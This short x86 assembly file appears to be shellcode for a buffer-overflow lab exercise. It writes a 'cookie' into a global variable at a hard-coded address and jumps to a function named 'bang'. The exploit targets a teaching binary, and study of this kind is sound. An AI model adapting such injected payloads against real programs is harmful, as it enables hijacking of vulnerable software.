# gcc bangcode.s -c -o bangcode.o -nostdlib -m32
.text
    movl $0x7b52e696, 0x804c218 # global_value = my cookie */
    movl $0x08048d05, %eax          # jump to bang at 0x08048d05 */
    jmp  *%eax
